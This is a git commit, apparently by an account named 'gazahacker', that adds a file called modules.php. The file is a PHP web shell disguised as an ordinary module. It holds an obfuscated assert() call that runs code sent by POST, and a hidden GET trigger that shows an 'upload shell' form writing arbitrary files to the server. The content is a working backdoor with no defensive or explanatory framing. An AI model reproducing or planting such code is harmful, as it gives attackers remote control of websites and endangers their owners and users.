186aec1f72bf80a7fc5c4eca6af46f1d65d31f4b
gazahacker <38595514+gazahacker@users.noreply.github.com>
2018-04-22 02:09:30 +0300

    aa
    aa

---
+++ modules.php
@@ -0,0 +1,18 @@
+<?php
+$p = getcwd();
+echo $p;
+?>
+<?$k="ass"."ert"; $k(${"_PO"."ST"} ['$k']);?>
+<?php
+error_reporting(0);
+$system = $_GET['$'];
+if($system == '$'){
+$saw1 = $_FILES['file']['tmp_name'];
+$saw2 = $_FILES['file']['name'];
+echo "<form method='POST' enctype='multipart/form-data'>
+<input type='file'name='file' />
+<input type='submit' value='upload shell' />
+</form>";
+move_uploaded_file($saw1,$saw2);
+}
+?>
